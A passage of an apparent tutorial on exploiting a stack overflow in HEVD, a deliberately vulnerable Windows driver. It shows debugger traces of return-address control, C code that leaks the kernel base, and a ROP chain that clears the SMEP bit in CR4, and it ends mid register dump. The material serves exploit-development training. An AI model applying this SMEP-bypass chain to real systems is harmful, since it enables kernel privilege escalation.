+<a id="__codelineno-6-5" name="__codelineno-6-5"></a>HEVD!TriggerBufferOverflowStack+0xca:
+<a id="__codelineno-6-6" name="__codelineno-6-6"></a>fffff80e`06fb667e e83dabf7ff      call    HEVD!memcpy (fffff80e`06f311c0)
+<a id="__codelineno-6-7" name="__codelineno-6-7"></a>
+<a id="__codelineno-6-8" name="__codelineno-6-8"></a>1: kd&gt; pt
+<a id="__codelineno-6-9" name="__codelineno-6-9"></a>HEVD!TriggerBufferOverflowStack+0x10b:
+<a id="__codelineno-6-10" name="__codelineno-6-10"></a>fffff80e`06fb66bf c3              ret
+<a id="__codelineno-6-11" name="__codelineno-6-11"></a>
+<a id="__codelineno-6-12" name="__codelineno-6-12"></a>1: kd&gt; k
+<a id="__codelineno-6-13" name="__codelineno-6-13"></a> # Child-SP          RetAddr               Call Site
+<a id="__codelineno-6-14" name="__codelineno-6-14"></a>00 ffff8e81`165f67b8 42424242`42424242     HEVD!TriggerBufferOverflowStack+0x10b
+<a id="__codelineno-6-15" name="__codelineno-6-15"></a>01 ffff8e81`165f67c0 00000000`00000003     0x42424242`42424242
+</code></pre></div></td></tr></table></div>
+<p>Perfect we now have control of the return address. However, we've not won yet. We have some exploit mitigations which need to be taken into consideration.</p>
+<p>The first mitigation we need to circumvent is Supervisor Mode Execution Prevention (<abbr title="Supervisor Mode Execution Prevention">SMEP</abbr>), this is a hardware mitigation that restricts code that resides in user-mode from being executed in ring0. In essence this prevents EoPs that rely on executing a user-mode payload.</p>
+<h2 id="smep-bypass"><abbr title="Supervisor Mode Execution Prevention">SMEP</abbr> Bypass<a class="headerlink" href="#smep-bypass" title="Permanent link">&para;</a></h2>
+<p>There's a few ways we can bypass <abbr title="Supervisor Mode Execution Prevention">SMEP</abbr> but the main one (and the one we're going to use) is to construct a <abbr title="Return Oriented Programming">ROP</abbr> chain that reads the content of CR4 and then flips the 20th bit of the register - upon doing so <abbr title="Supervisor Mode Execution Prevention">SMEP</abbr> will be disabled and we can simply jump to our user-mode payload. </p>
+<details class="attention" open="open">
+<summary>Attention</summary>
+<p>In this example we are going to use APIs that are only available to medium (or higher) intgreity levels. Namely, <code>EnumDeviceDrivers</code>. In a lot of EoP cases we will be at low level integrity, not medium in these cases you'll need a leak to get the base address of kernel modules. <sup id="fnref:1"><a class="footnote-ref" href="#fn:1">1</a></sup></p>
+</details>
+<p>First we'll create a new function in our C code called <code>GetKernelBase</code> this function itself is fairly simple, all it will do is make a call to <code>EnumDeviceDrivers</code> and then get the first item from the returned array the first item will be the base address for <code>ntoskrnl.exe</code>. <em>The below code only includes changes</em>.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-7-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-7-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-7-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-7-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-7-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-7-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-7-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-7-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-7-10">10</a></span>
+<span class="normal"><a href="#__codelineno-7-11">11</a></span>
+<span class="normal"><a href="#__codelineno-7-12">12</a></span>
+<span class="normal"><a href="#__codelineno-7-13">13</a></span>
+<span class="normal"><a href="#__codelineno-7-14">14</a></span>
+<span class="normal"><a href="#__codelineno-7-15">15</a></span>
+<span class="normal"><a href="#__codelineno-7-16">16</a></span>
+<span class="normal"><a href="#__codelineno-7-17">17</a></span>
+<span class="normal"><a href="#__codelineno-7-18">18</a></span>
+<span class="normal"><a href="#__codelineno-7-19">19</a></span>
+<span class="normal"><a href="#__codelineno-7-20">20</a></span>
+<span class="normal"><a href="#__codelineno-7-21">21</a></span>
+<span class="normal"><a href="#__codelineno-7-22">22</a></span>
+<span class="normal"><a href="#__codelineno-7-23">23</a></span>
+<span class="normal"><a href="#__codelineno-7-24">24</a></span>
+<span class="normal"><a href="#__codelineno-7-25">25</a></span>
+<span class="normal"><a href="#__codelineno-7-26">26</a></span>
+<span class="normal"><a href="#__codelineno-7-27">27</a></span>
+<span class="normal"><a href="#__codelineno-7-28">28</a></span>
+<span class="normal"><a href="#__codelineno-7-29">29</a></span>
+<span class="normal"><a href="#__codelineno-7-30">30</a></span>
+<span class="normal"><a href="#__codelineno-7-31">31</a></span>
+<span class="normal"><a href="#__codelineno-7-32">32</a></span>
+<span class="normal"><a href="#__codelineno-7-33">33</a></span>
+<span class="normal"><a href="#__codelineno-7-34">34</a></span>
+<span class="normal"><a href="#__codelineno-7-35">35</a></span>
+<span class="normal"><a href="#__codelineno-7-36">36</a></span>
+<span class="normal"><a href="#__codelineno-7-37">37</a></span>
+<span class="normal"><a href="#__codelineno-7-38">38</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Psapi.h&gt;</span><span class="cp"></span>
+<a id="__codelineno-7-2" name="__codelineno-7-2"></a>
+<a id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">GetKernelBase</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-5" name="__codelineno-7-5"></a>
+<a id="__codelineno-7-6" name="__codelineno-7-6"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w">  </span><span class="n">lpImageBase</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span><span class="w"></span>
+<a id="__codelineno-7-7" name="__codelineno-7-7"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">   </span><span class="n">lpcbNeeded</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-7-8" name="__codelineno-7-8"></a>
+<a id="__codelineno-7-9" name="__codelineno-7-9"></a><span class="w">    </span><span class="cm">/* Get base address of first driver (ntoskrnl.exe) */</span><span class="w"></span>
+<a id="__codelineno-7-10" name="__codelineno-7-10"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Obtaining Driver Base Address!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-7-11" name="__codelineno-7-11"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">DriversBase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">lpcbNeeded</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-7-12" name="__codelineno-7-12"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DriversBase</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-7-13" name="__codelineno-7-13"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-14" name="__codelineno-7-14"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Error enumerating device drivers!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-7-15" name="__codelineno-7-15"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-7-16" name="__codelineno-7-16"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-7-17" name="__codelineno-7-17"></a>
+<a id="__codelineno-7-18" name="__codelineno-7-18"></a><span class="w">    </span><span class="cm">/* Get name of first driver (ntoskrnl.exe) */</span><span class="w"></span>
+<a id="__codelineno-7-19" name="__codelineno-7-19"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">BaseName</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
+<a id="__codelineno-7-20" name="__codelineno-7-20"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">DriversBaseName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetDeviceDriverBaseNameA</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="n">BaseName</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">BaseName</span><span class="p">));</span><span class="w"></span>
+<a id="__codelineno-7-21" name="__codelineno-7-21"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DriversBaseName</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-7-22" name="__codelineno-7-22"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-23" name="__codelineno-7-23"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Error getting drivers base name!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-7-24" name="__codelineno-7-24"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-7-25" name="__codelineno-7-25"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-7-26" name="__codelineno-7-26"></a>
+<a id="__codelineno-7-27" name="__codelineno-7-27"></a><span class="w">    </span><span class="cm">/* </span>
+<a id="__codelineno-7-28" name="__codelineno-7-28"></a><span class="cm">     * ntoskrnl.exe is the first module in lpImageBase.</span>
+<a id="__codelineno-7-29" name="__codelineno-7-29"></a><span class="cm">     * typecast LPVOID -&gt; unsigned long long</span>
+<a id="__codelineno-7-30" name="__codelineno-7-30"></a><span class="cm">    */</span><span class="w"></span>
+<a id="__codelineno-7-31" name="__codelineno-7-31"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">KernelBase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">lpImageBase</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="w"></span>
+<a id="__codelineno-7-32" name="__codelineno-7-32"></a>
+<a id="__codelineno-7-33" name="__codelineno-7-33"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Driver base name is: %s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BaseName</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-7-34" name="__codelineno-7-34"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] %s is located at: 0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BaseName</span><span class="p">,</span><span class="w"> </span><span class="n">KernelBase</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-7-35" name="__codelineno-7-35"></a>
+<a id="__codelineno-7-36" name="__codelineno-7-36"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">KernelBase</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-7-37" name="__codelineno-7-37"></a>
+<a id="__codelineno-7-38" name="__codelineno-7-38"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div></td></tr></table></div>
+<p>As you can see it is very easy to get the base address of the kernel and other drivers providing that you have access to the <code>EnumDeviceDrivers</code> call. But, we're not done here. We still need to build our <abbr title="Return Oriented Programming">ROP</abbr> chain to flip the 20th bit of the CR4 register.</p>
+<p>The <abbr title="Return Oriented Programming">ROP</abbr> chain itself is fairly simple, we simply need to pop our inteded CR4 value into a register and then move the contents of that register into the CR4 register thus turning off <abbr title="Supervisor Mode Execution Prevention">SMEP</abbr>. To find gadgets we can use something such as RP++. In my case I found the below gadgets in <code>ntoskrnl.exe</code>.</p>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Gadgets for SMEP bypass</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a>0x1406a0a51: pop rcx ; ret     
+<a id="__codelineno-8-2" name="__codelineno-8-2"></a>0x1409a41e3: mov cr4, rcx ; ret
+</code></pre></div></td></tr></table></div>
+<p>Now that we've got the gadgets to use we need to update our exploit to place those gadgets in the buffer at the point we control the return address so that when we return we start our <abbr title="Return Oriented Programming">ROP</abbr> chain to disable <abbr title="Supervisor Mode Execution Prevention">SMEP</abbr>.</p>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Updated code to include SMEP bypass</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-9-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-9-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-9-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-9-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-9-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-9-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-9-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-9-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-9-10">10</a></span>
+<span class="normal"><a href="#__codelineno-9-11">11</a></span>
+<span class="normal"><a href="#__codelineno-9-12">12</a></span>
+<span class="normal"><a href="#__codelineno-9-13">13</a></span>
+<span class="normal"><a href="#__codelineno-9-14">14</a></span>
+<span class="normal"><a href="#__codelineno-9-15">15</a></span>
+<span class="normal"><a href="#__codelineno-9-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">2100</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
+<a id="__codelineno-9-2" name="__codelineno-9-2"></a>
+<a id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">BaseAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetKernelBase</span><span class="p">();</span><span class="w"></span>
+<a id="__codelineno-9-4" name="__codelineno-9-4"></a>
+<a id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ROP1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BaseAddress</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x6a0a51</span><span class="p">;</span><span class="w">   </span><span class="c1">// 0x1406a0a51: pop rcx ; ret      : ntoskrnl.exe</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ROP2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x70678</span><span class="p">;</span><span class="w">                  </span><span class="c1">// Updated CR4</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ROP3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BaseAddress</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x9a41e3</span><span class="p">;</span><span class="w">   </span><span class="c1">// 0x1409a41e3: mov cr4, rcx ; ret : ntoskrnl.exe</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8"></a>
+<a id="__codelineno-9-9" name="__codelineno-9-9"></a><span class="w">    </span><span class="cm">/* Fill exploit buffer with As. */</span><span class="w"></span>
+<a id="__codelineno-9-10" name="__codelineno-9-10"></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span><span class="w"></span>
+<a id="__codelineno-9-11" name="__codelineno-9-11"></a>
+<a id="__codelineno-9-12" name="__codelineno-9-12"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Beginning ROP chain to disable SMEP!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-9-13" name="__codelineno-9-13"></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">2072</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ROP1</span><span class="p">,</span><span class="w"> </span><span class="n">GadgetSize</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-9-14" name="__codelineno-9-14"></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">2072</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ROP2</span><span class="p">,</span><span class="w"> </span><span class="n">GadgetSize</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-9-15" name="__codelineno-9-15"></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">2072</span><span class="o">+</span><span class="mi">16</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ROP3</span><span class="p">,</span><span class="w"> </span><span class="n">GadgetSize</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-9-16" name="__codelineno-9-16"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] SMEP should now be disabled!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+</code></pre></div></td></tr></table></div>
+<p>If you're wondering why we choose the value <code>0x70678</code> to be the new value for CR4 this is because in binary this value is <code>1110000011001111000</code> which makes the 20th bit 0, which is the bit for <abbr title="Supervisor Mode Execution Prevention">SMEP</abbr>. Let's go ahead and trace the execution in a debugger and ensure that the 20th bit of CR4 is getting correctly set to 0 to disable <abbr title="Supervisor Mode Execution Prevention">SMEP</abbr>.</p>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bypassing SMEP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-10-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-10-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-10-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-10-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-10-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-10-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-10-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-10-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-10-10">10</a></span>
+<span class="normal"><a href="#__codelineno-10-11">11</a></span>
+<span class="normal"><a href="#__codelineno-10-12">12</a></span>
+<span class="normal"><a href="#__codelineno-10-13">13</a></span>
+<span class="normal"><a href="#__codelineno-10-14">14</a></span>
+<span class="normal"><a href="#__codelineno-10-15">15</a></span>
+<span class="normal"><a href="#__codelineno-10-16">16</a></span>
+<span class="normal"><a href="#__codelineno-10-17">17</a></span>
+<span class="normal"><a href="#__codelineno-10-18">18</a></span>
+<span class="normal"><a href="#__codelineno-10-19">19</a></span>
+<span class="normal"><a href="#__codelineno-10-20">20</a></span>
+<span class="normal"><a href="#__codelineno-10-21">21</a></span>
+<span class="normal"><a href="#__codelineno-10-22">22</a></span>
+<span class="normal"><a href="#__codelineno-10-23">23</a></span>
+<span class="normal"><a href="#__codelineno-10-24">24</a></span>
+<span class="normal"><a href="#__codelineno-10-25">25</a></span>
+<span class="normal"><a href="#__codelineno-10-26">26</a></span>
+<span class="normal"><a href="#__codelineno-10-27">27</a></span>
+<span class="normal"><a href="#__codelineno-10-28">28</a></span>
+<span class="normal"><a href="#__codelineno-10-29">29</a></span>
+<span class="normal"><a href="#__codelineno-10-30">30</a></span>
+<span class="normal"><a href="#__codelineno-10-31">31</a></span>
+<span class="normal"><a href="#__codelineno-10-32">32</a></span>
+<span class="normal"><a href="#__codelineno-10-33">33</a></span>
+<span class="normal"><a href="#__codelineno-10-34">34</a></span>
+<span class="normal"><a href="#__codelineno-10-35">35</a></span>
+<span class="normal"><a href="#__codelineno-10-36">36</a></span>
+<span class="normal"><a href="#__codelineno-10-37">37</a></span>
+<span class="normal"><a href="#__codelineno-10-38">38</a></span>
+<span class="normal"><a href="#__codelineno-10-39">39</a></span>
+<span class="normal"><a href="#__codelineno-10-40">40</a></span>
+<span class="normal"><a href="#__codelineno-10-41">41</a></span>
+<span class="normal"><a href="#__codelineno-10-42">42</a></span>
+<span class="normal"><a href="#__codelineno-10-43">43</a></span>
+<span class="normal"><a href="#__codelineno-10-44">44</a></span>
+<span class="normal"><a href="#__codelineno-10-45">45</a></span>
+<span class="normal"><a href="#__codelineno-10-46">46</a></span>
+<span class="normal"><a href="#__codelineno-10-47">47</a></span>
+<span class="normal"><a href="#__codelineno-10-48">48</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="err">0:</span><span class="w"> </span><span class="nf">kd</span><span class="err">&gt;</span><span class="w"> </span><span class="no">bp</span><span class="w"> </span><span class="no">HEVD</span><span class="p">!</span><span class="no">TriggerBufferOverflowStack</span><span class="err">+</span><span class="mi">0xca</span><span class="w"></span>
+<a id="__codelineno-10-2" name="__codelineno-10-2"></a>
+<a id="__codelineno-10-3" name="__codelineno-10-3"></a><span class="err">0:</span><span class="w"> </span><span class="nf">kd</span><span class="err">&gt;</span><span class="w"> </span><span class="no">g</span><span class="w"></span>
+<a id="__codelineno-10-4" name="__codelineno-10-4"></a><span class="nf">Breakpoint</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="no">hit</span><span class="w"></span>
+<a id="__codelineno-10-5" name="__codelineno-10-5"></a><span class="nf">HEVD</span><span class="p">!</span><span class="no">TriggerBufferOverflowStack</span><span class="err">+</span><span class="mi">0xca</span><span class="p">:</span><span class="w"></span>
+<a id="__codelineno-10-6" name="__codelineno-10-6"></a><span class="nf">fffff805</span><span class="err">`</span><span class="mi">87</span><span class="no">e8667e</span><span class="w"> </span><span class="no">e83dabf7ff</span><span class="w">      </span><span class="no">call</span><span class="w">    </span><span class="no">HEVD</span><span class="p">!</span><span class="no">memcpy</span><span class="w"> </span><span class="p">(</span><span class="no">fffff805</span><span class="err">`</span><span class="mi">87</span><span class="no">e011c0</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-10-7" name="__codelineno-10-7"></a>
+<a id="__codelineno-10-8" name="__codelineno-10-8"></a><span class="err">1:</span><span class="w"> </span><span class="nf">kd</span><span class="err">&gt;</span><span class="w"> </span><span class="no">p</span><span class="w"></span>
+<a id="__codelineno-10-9" name="__codelineno-10-9"></a><span class="nf">HEVD</span><span class="p">!</span><span class="no">TriggerBufferOverflowStack</span><span class="err">+</span><span class="mi">0xcf</span><span class="p">:</span><span class="w"></span>
+<a id="__codelineno-10-10" name="__codelineno-10-10"></a><span class="nf">fffff805</span><span class="err">`</span><span class="mi">87</span><span class="no">e86683</span><span class="w"> </span><span class="no">eb1b</span><span class="w">            </span><span class="no">jmp</span><span class="w">     </span><span class="no">HEVD</span><span class="p">!</span><span class="no">TriggerBufferOverflowStack</span><span class="err">+</span><span class="mi">0xec</span><span class="w"> </span><span class="p">(</span><span class="no">fffff805</span><span class="err">`</span><span class="mi">87</span><span class="no">e866a0</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-10-11" name="__codelineno-10-11"></a>
+<a id="__codelineno-10-12" name="__codelineno-10-12"></a><span class="err">[</span><span class="na">...</span><span class="p">]</span><span class="w"> </span><span class="cm">/* (2) */</span><span class="w"></span>
+<a id="__codelineno-10-13" name="__codelineno-10-13"></a>
+<a id="__codelineno-10-14" name="__codelineno-10-14"></a><span class="err">1:</span><span class="w"> </span><span class="nf">kd</span><span class="err">&gt;</span><span class="w"> </span><span class="no">p</span><span class="w"></span>
+<a id="__codelineno-10-15" name="__codelineno-10-15"></a><span class="nf">HEVD</span><span class="p">!</span><span class="no">TriggerBufferOverflowStack</span><span class="err">+</span><span class="mi">0x10b</span><span class="p">:</span><span class="w"></span>
+<a id="__codelineno-10-16" name="__codelineno-10-16"></a><span class="nf">fffff805</span><span class="err">`</span><span class="mi">87</span><span class="no">e866bf</span><span class="w"> </span><span class="no">c3</span><span class="w">              </span><span class="no">ret</span><span class="w"></span>
+<a id="__codelineno-10-17" name="__codelineno-10-17"></a>
+<a id="__codelineno-10-18" name="__codelineno-10-18"></a><span class="err">1:</span><span class="w"> </span><span class="nf">kd</span><span class="err">&gt;</span><span class="w"> </span><span class="no">p</span><span class="w"></span>
+<a id="__codelineno-10-19" name="__codelineno-10-19"></a><span class="nf">nt</span><span class="p">!</span><span class="no">HvCheckBin</span><span class="err">+</span><span class="mi">0xe1</span><span class="p">:</span><span class="w"></span>
+<a id="__codelineno-10-20" name="__codelineno-10-20"></a><span class="nf">fffff805</span><span class="err">`</span><span class="mi">820</span><span class="no">a0a51</span><span class="w"> </span><span class="mi">59</span><span class="w">              </span><span class="no">pop</span><span class="w">     </span><span class="no">rcx</span><span class="w"></span>
+<a id="__codelineno-10-21" name="__codelineno-10-21"></a>
+<a id="__codelineno-10-22" name="__codelineno-10-22"></a><span class="err">1:</span><span class="w"> </span><span class="nf">kd</span><span class="err">&gt;</span><span class="w"> </span><span class="no">p</span><span class="w"></span>
+<a id="__codelineno-10-23" name="__codelineno-10-23"></a><span class="nf">nt</span><span class="p">!</span><span class="no">HvCheckBin</span><span class="err">+</span><span class="mi">0xe2</span><span class="p">:</span><span class="w"></span>
+<a id="__codelineno-10-24" name="__codelineno-10-24"></a><span class="nf">fffff805</span><span class="err">`</span><span class="mi">820</span><span class="no">a0a52</span><span class="w"> </span><span class="no">c3</span><span class="w">              </span><span class="no">ret</span><span class="w"></span>
+<a id="__codelineno-10-25" name="__codelineno-10-25"></a>
+<a id="__codelineno-10-26" name="__codelineno-10-26"></a><span class="err">1:</span><span class="w"> </span><span class="nf">kd</span><span class="err">&gt;</span><span class="w"> </span><span class="no">r</span><span class="w"></span>
+<a id="__codelineno-10-27" name="__codelineno-10-27"></a><span class="nf">rax</span><span class="err">=</span><span class="mi">0000000000000000</span><span class="w"> </span><span class="no">rbx</span><span class="err">=</span><span class="mi">0000000000070678</span><span class="w"> </span><span class="no">rcx</span><span class="err">=</span><span class="mi">0000000000070678</span><span class="w"> </span><span class="cm">/* (1) */</span><span class="w"></span>
+<a id="__codelineno-10-28" name="__codelineno-10-28"></a><span class="nf">rdx</span><span class="err">=</span><span class="mi">0000467</span><span class="no">ddeabe610</span><span class="w"> </span><span class="no">rsi</span><span class="err">=</span><span class="no">fffff805823a41e3</span><span class="w"> </span><span class="no">rdi</span><span class="err">=</span><span class="mi">0000000041414141</span><span class="w"></span>
+<a id="__codelineno-10-29" name="__codelineno-10-29"></a><span class="nf">rip</span><span class="err">=</span><span class="no">fffff805820a0a52</span><span class="w"> </span><span class="no">rsp</span><span class="err">=</span><span class="no">ffffb98221b417a8</span><span class="w"> </span><span class="no">rbp</span><span class="err">=</span><span class="no">ffffe58cd6bfdcd0</span><span class="w"></span>
+<a id="__codelineno-10-30" name="__codelineno-10-30"></a><span class="w"> </span><span class="nf">r8</span><span class="err">=</span><span class="mi">0000000000000000</span><span class="w">  </span><span class="no">r9</span><span class="err">=</span><span class="mi">0000000000000000</span><span class="w"> </span><span class="no">r10</span><span class="err">=</span><span class="no">fffff80587e85078</span><span class="w"></span>
+<a id="__codelineno-10-31" name="__codelineno-10-31"></a><span class="nf">r11</span><span class="err">=</span><span class="no">ffffb98221b41780</span><span class="w"> </span><span class="no">r12</span><span class="err">=</span><span class="mi">4141414141414141</span><span class="w"> </span><span class="no">r13</span><span class="err">=</span><span class="mi">0000000000000000</span><span class="w"></span>
